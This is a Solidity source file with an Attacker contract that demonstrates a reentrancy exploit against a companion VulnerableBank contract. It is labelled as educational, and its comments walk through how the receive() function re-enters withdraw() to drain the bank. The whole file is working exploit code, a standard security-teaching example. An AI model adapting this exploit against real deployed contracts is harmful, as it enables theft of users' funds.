// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

/**
 * ⚠️ EXPLOIT CONTRACT FOR EDUCATIONAL PURPOSES ONLY
 *
 * This contract demonstrates a reentrancy attack on VulnerableBank.
 * It is designed to teach security concepts and attack vectors.
 * DO NOT use for malicious purposes.
 *
 * Attack flow:
 * 1. Attacker deposits 1 ETH into VulnerableBank
 * 2. Attacker calls attack() to trigger withdraw()
 * 3. When Bank sends ETH, Attacker's receive() is called
 * 4. receive() immediately calls withdraw() AGAIN
 * 5. This repeats recursively until Bank is drained
 * 6. Attacker ends up with more ETH than originally deposited
 */

contract Attacker {
    // =====================
    // State Variables
    // =====================

    VulnerableBank public bank;
    uint256 public attackCount; // Track number of reentrant calls

    // =====================
    // Constructor
    // =====================

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // =====================
    // Attack Functions
    // =====================

    /**
     * @notice Start the reentrancy attack
     * @dev Flow:
     *      1. Deposit 1 ETH into bank
     *      2. Call withdraw() which triggers receive()
     *      3. receive() calls withdraw() again (reentrancy)
     *      4. Loop until bank balance is insufficient
     */
    function attack() public payable {
        require(msg.value >= 1 ether, "Must send at least 1 ETH");

        // Step 1: Deposit initial amount into the vulnerable bank
        bank.deposit{value: msg.value}();

        // Step 2: Trigger the first withdrawal
        // This will call receive() when ETH is sent
        bank.withdraw();

        // After the reentrancy chain completes, we can check results
    }

    /**
     * @notice Get attacker's balance in the bank
     */
    function getBalanceInBank() public view returns (uint256) {
        return bank.getBalance(address(this));
    }

    /**
     * @notice Get ETH balance of this contract
     */
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // =====================
    // Fallback Functions
    // =====================

    /**
     * @notice receive() is called when ETH is sent to this contract
     * This is where the reentrancy magic happens!
     *
     * Each time withdraw() sends ETH, this function is triggered.
     * We immediately call withdraw() again before the balance is updated.
     */
    receive() external payable {
        // Increment attack counter
        attackCount++;

        // Get current balance in bank
        uint256 bankBalance = bank.getBalance(address(this));

        // Continue reentering if we still have balance
        // This prevents infinite loops (contract would run out of gas anyway)
        if (bankBalance > 0) {
            bank.withdraw();
        }
    }

    /**
     * @notice Fallback for non-function calls
     */
    fallback() external payable {}
}
